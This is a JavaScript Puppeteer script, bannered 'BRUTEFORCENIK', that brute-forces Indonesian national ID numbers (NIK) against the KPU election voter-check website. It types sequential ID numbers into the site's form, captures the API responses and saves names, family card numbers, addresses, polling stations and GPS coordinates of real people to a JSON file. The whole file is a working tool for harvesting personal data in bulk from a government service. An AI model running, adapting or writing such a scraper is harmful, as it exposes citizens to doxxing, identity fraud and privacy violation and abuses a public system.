import puppeteer from 'puppeteer'
import fs from 'fs'
import path from 'path'
import promptSync from 'prompt-sync'
import { provinsiList } from './provinsi.js'
import { kabkot } from './kabupatenkota.js'

const prompt = promptSync()
// const baseNik = '327322210605'
const baseNik = '321708040300'
const outputFile = path.resolve('./hasil.json') // ganti ke .json
const collectedData = []
const start = 0
const length = 100



console.log(`
   ____  ____  __  ________________________  ____  _____________   ________ __
  / __ )/ __ \\/ / / /_  __/ ____/ ____/ __ \\/ __ \\/ ____/ ____/ | / /  _/ //_/
 / __  / /_/ / / / / / / / __/ / /_  / / / / /_/ / /   / __/ /  |/ // // ,<   
/ /_/ / _, _/ /_/ / / / / /___/ __/ / /_/ / _, _/ /___/ /___/ /|  // // /| |  
\\____/_/ |_|\\____/ /_/ /_____/_/    \\____/_/ |_|\\____/_____/_/ |_/___/_/ |_|  
`)

// 1. Tampilkan provinsi
console.log("List Provinsi:")
provinsiList.forEach(p => {
  console.log(`${p.kode}: ${p.nama}`)
})

// 2. Input provinsi dengan validasi
const validProvKode = provinsiList.map(p => p.kode)
let provInput
do {
  provInput = prompt('Pilih kode provinsi [NN]: ').trim()
  if (!validProvKode.includes(provInput)) {
    console.log(`Kode provinsi "${provInput}" tidak valid. Silakan coba lagi.`)
  }
} while (!validProvKode.includes(provInput))

const provinsiTerpilih = provinsiList.find(p => p.kode === provInput)
console.log(`Provinsi yang dipilih: ${provinsiTerpilih.nama}`)

async function main() {
  const browser = await puppeteer.launch({ headless: false })
  const page = await browser.newPage()

  for (let i = start; i <= length; i++) {
    const suffix = i.toString().padStart(4, '0')
    const fullNik = baseNik + suffix

    const result = await new Promise(async (resolve) => {
      const timeout = setTimeout(() => {
        resolve(null)
      }, 10000)

      const handleResponse = async (response) => {
        const url = response.url()
        if (url === 'https://cekdptonline.kpu.go.id/v2') {
          try {
            const bodyText = await response.text()
            const json = JSON.parse(bodyText)
            if (json?.data?.findNikSidalih) {
              const data = json.data.findNikSidalih
              clearTimeout(timeout)
              resolve({
                nik : fullNik,
                nama: data.nama,
                nkk: data.nkk,
                kabupaten: data.kabupaten,
                kecamatan: data.kecamatan,
                kelurahan: data.kelurahan,
                tps: data.tps,
                alamat: data.alamat,
                lat: data.lat,
                lon: data.lon
              })
            } else {
              clearTimeout(timeout)
              resolve(null)
            }
          } catch (err) {
            console.error('❌ Gagal parse JSON:', err.message)
            clearTimeout(timeout)
            resolve(null)
          }
        }
      }

      page.removeAllListeners('response')
      page.on('response', handleResponse)

      try {
        await page.goto('https://cekdptonline.kpu.go.id/', {
          waitUntil: 'domcontentloaded'
        })

        await page.waitForSelector('form.av-tooltip input.form-control.is-valid', {
          timeout: 5000
        })

        await page.click('form.av-tooltip input.form-control.is-valid', { clickCount: 3 })
        await page.type('form.av-tooltip input.form-control.is-valid', fullNik)

        const buttonSelector = 'button.btn.btn-primary[style*="position: absolute"]'
        await page.waitForSelector(buttonSelector, { timeout: 5000 })
        await page.click(buttonSelector)
      } catch (error) {
        console.error(`❌ Error NIK ${fullNik}:`, error.message)
        clearTimeout(timeout)
        resolve(null)
      }
    })
    if (result?.nama != null) {
      collectedData.push(result)
      console.log(`✅ Data ditemukan untuk NIK: ${fullNik} - ${result?.nama}`)
    }
    else {
      console.log(`❌ Data tidak ditemukan untuk NIK: ${fullNik}`)
    }

    if (i % 100 === 0) {
      console.log(`📊 Progres: ${i}/${length}`)
    }
  }

  await browser.close()

  if (collectedData.length > 0) {
    fs.writeFileSync(outputFile, JSON.stringify(collectedData, null, 2), 'utf-8')
    console.log(`✅ Berhasil simpan ${collectedData.length} data ke ${outputFile}`)
  } else {
    console.log('⚠️ Tidak ada data ditemukan.')
  }
}

main()
